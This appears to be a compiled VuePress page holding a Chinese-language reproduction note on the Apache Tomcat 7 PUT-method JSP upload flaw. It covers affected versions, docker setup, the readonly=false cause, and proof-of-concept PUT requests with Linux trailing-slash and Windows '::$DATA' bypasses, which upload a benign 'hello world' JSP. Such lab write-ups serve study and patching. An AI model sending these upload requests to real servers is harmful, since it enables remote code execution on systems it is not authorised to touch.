import{_ as e,p as s,q as t,s as a,R as n,Z as p}from"./framework-47a2e622.js";const l="/images/微信图片_20220905173358.png",o="/images/微信图片_20220905173714.png",c="/images/微信图片_20220905173806.png",r={},i=a("h2",{id:"漏洞简介",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#漏洞简介","aria-hidden":"true"},"#"),n(" 漏洞简介")],-1),d=a("p",null,"当 Tomcat 启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。",-1),h=a("div",{class:"custom-container info"},[a("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[a("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[a("circle",{cx:"12",cy:"12",r:"9"}),a("path",{d:"M12 8h.01"}),a("path",{d:"M11 12h1v4h1"})])]),a("p",{class:"custom-container-title"},"影响版本"),a("ul",{class:"contains-task-list"},[a("li",{class:"task-list-item"},[a("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),n(" Apache Tomcat 7.0.0 ~ 7.0.79（7.0.81 修复不完全）")])])],-1),k=p('<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>使用 docker 搭建环境：</p><p><img src="'+l+'" alt=""></p><p>使用 PUT 方法将 JSP 文件写入服务器：</p><p><img src="'+o+'" alt=""></p><p>访问写入的文件：</p><p><img src="'+c+`" alt=""></p><p>POC：</p><ul><li>Linux</li></ul><div class="language-http" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">PUT</span> <span class="token request-target url">/test.jsp/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.43.127:8080</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">54</span></span>

&lt;%
	String str = &quot;hello world&quot;;
	out.print(str);
%&gt;
</code></pre></div><ul><li>Windows</li></ul><div class="language-http" data-ext="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">PUT</span> <span class="token request-target url">/test.jsp::$DATA</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.43.127:8080</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">54</span></span>

&lt;%
	String str = &quot;hello world&quot;;
	out.print(str);
%&gt;
</code></pre></div><h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理" aria-hidden="true">#</a> 漏洞原理</h2><p>漏洞本质是 Tomcat 配置了可写（readonly=false），导致我们可以往服务器写文件：</p><div class="language-ini" data-ext="ini"><pre class="language-ini"><code>&lt;servlet&gt;
    &lt;servlet-name&gt;default&lt;/servlet-name&gt;
    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
    &lt;init-param&gt;
        &lt;param-name&gt;debug&lt;/param-name&gt;
        &lt;param-value&gt;0&lt;/param-value&gt;
    &lt;/init-param&gt;
    &lt;init-param&gt;
        &lt;param-name&gt;listings&lt;/param-name&gt;
        &lt;param-value&gt;false&lt;/param-value&gt;
    &lt;/init-param&gt;
    &lt;init-param&gt;
        &lt;param-name&gt;readonly&lt;/param-name&gt;
        &lt;param-value&gt;false&lt;/param-value&gt;
    &lt;/init-param&gt;
    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
&lt;/servlet&gt;
</code></pre></div>`,15),u=[i,d,h,k];function g(m,v){return s(),t("div",null,u)}const x=e(r,[["render",g],["__file","1.html.vue"]]);export{x as default};
